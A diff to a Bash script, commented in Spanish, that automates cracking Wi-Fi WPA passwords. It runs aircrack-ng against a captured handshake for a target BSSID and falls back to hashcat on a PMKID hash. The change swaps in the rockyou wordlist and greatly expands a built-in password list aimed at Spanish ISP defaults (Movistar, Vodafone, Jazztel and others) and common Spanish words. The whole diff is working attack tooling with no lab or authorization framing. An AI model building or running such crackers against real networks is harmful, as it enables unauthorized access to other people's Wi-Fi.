@@ -114,42 +114,199 @@ if [ -z "$CAPFILE" ] || [ "$CAP_SIZE" -le 24 ]; then
   exit 0
 fi
 
-# Wordlist con passwords comunes
-cat > /tmp/wt-wl.txt << 'WORDLIST'
+# ── Wordlist: $WORDLIST env → rockyou.txt → rockyou.txt.gz → built-in ────────
+ROCKYOU=/usr/share/wordlists/rockyou.txt
+ROCKYOU_GZ=/usr/share/wordlists/rockyou.txt.gz
+WL=/tmp/wt-wl.txt
+
+if [ -n "$WORDLIST" ] && [ -f "$WORDLIST" ]; then
+  WL="$WORDLIST"
+  log "wordlist: $WORDLIST"
+elif [ -f "$ROCKYOU" ]; then
+  WL="$ROCKYOU"
+  log "wordlist: rockyou.txt ($(wc -l < "$ROCKYOU" | tr -d ' ') entradas)"
+elif [ -f "$ROCKYOU_GZ" ]; then
+  log "descomprimiendo rockyou.txt.gz (puede tardar ~20s)..."
+  zcat "$ROCKYOU_GZ" > /tmp/rockyou.txt
+  WL=/tmp/rockyou.txt
+  log "wordlist: rockyou descomprimido ($(wc -l < "$WL" | tr -d ' ') entradas)"
+else
+  log "wordlist: lista built-in (rockyou no encontrado)"
+  cat > "$WL" << 'WORDLIST'
 12345678
-admin1234
-pineapple123
-qwerty123
-movistar1
-password
+123456789
 1234567890
-familia2024
-password1
-password123
-qwerty
 12345
 123456
-123456789
-wifi1234
-home1234
-movistar
-orange
-vodafone
-micasa
+1234
+password
+password1
+password123
+passw0rd
+qwerty
+qwerty123
+qwertyuiop
+iloveyou
+letmein
+welcome
+monkey
+dragon
+master
+shadow
+sunshine
+princess
+football
+baseball
+superman
+batman
+trustno1
+abc123
+admin
+admin123
+admin1234
+default
+root
+toor
+router
+internet
+wireless
+network
+home
+wifi
 wifi123
+wifi1234
 wifi12345
 wifi2024
-router
-admin
-default
-internet
+wifi2025
+wifi2023
+mywifi
+homewifi
+freewifi
+wifipass
+wifipassword
+casa
+micasa
+mihogar
+hogar
+familia
+familywifi
+movistar
+movistar1
+movistar2
+movistar123
+movistar1234
+movistarwifi
+orange
+orangewifi
+orange123
+orange1234
+vodafone
+vodafone1
+vodafone123
+vodafonewifi
+jazztel
+jazztel1
+masmovil
+euskaltel
+telecable
+R1wifi
+r1wifi
+lowi
+lowiwifi
+yoigo
+yoigowifi
 1234abcd
 abcd1234
-casa1234
+abc12345
+pass1234
+pass123
+pass12345
+test1234
+test123
+mypassword
+mypass
+secret
+secure
+changeme
+letmein1
+hello123
+hello1234
+computer
+internet1
+internet123
+qazwsx
+123qwe
+123abc
+aaa111
+111222
+111111
+222222
+333333
+444444
+555555
+666666
+777777
+888888
+999999
+000000
+11111111
+22222222
+33333333
+55555555
+66666666
+77777777
+88888888
+99999999
+00000000
+10203040
+12341234
+11223344
+13131313
+24681357
+98765432
+987654321
+0987654321
+147258369
+password2024
+password2025
+password2023
+wifi202
+casa2024
+casa2023
+micasa123
+hogar2024
+nueva2024
+clave1234
+clave123
+contrasena
+contrasena1
+contraseña1
+micontrasena
+usuario
+usuario1
+nombre123
+dios1234
+amor1234
+estrella
+primavera
+verano2024
+invierno
+otoño2024
+barcelona
+madrid123
+espana123
+valenciana
+bilbao123
+sevilla1
+malaga123
+alicante
+granada1
+zaragoza
 WORDLIST
+fi
 
 log "crackeando handshake (cap: ${CAP_SIZE}B, max 60s)..."
-OUT=$(timeout 60 aircrack-ng -w /tmp/wt-wl.txt -b "$TBSSID" "$CAPFILE" </dev/null 2>&1)
+OUT=$(timeout 60 aircrack-ng -w "$WL" -b "$TBSSID" "$CAPFILE" </dev/null 2>&1)
 OUT=$(printf '%s' "$OUT" | sed 's/\x1b\[[0-9;]*[A-Za-z]//g' | tr -d '\r')
 
 if echo "$OUT" | grep -q "KEY FOUND!"; then
@@ -211,7 +368,7 @@ elif echo "$OUT" | grep -qiE "no valid wpa|no networks found|got no data|quittin
   log "PMKID capturado ($NHASH hash). Crackeando con hashcat..."
 
   POTFILE=/tmp/pmkid-$$.pot
-  timeout 120 hashcat -m 22000 /tmp/pmkid.hash /tmp/wt-wl.txt \
+  timeout 120 hashcat -m 22000 /tmp/pmkid.hash "$WL" \
     --force --quiet --potfile-path="$POTFILE" 2>/tmp/hashcat.log
 
   CRACKED=$(hashcat -m 22000 /tmp/pmkid.hash --show --potfile-path="$POTFILE" 2>/dev/null \
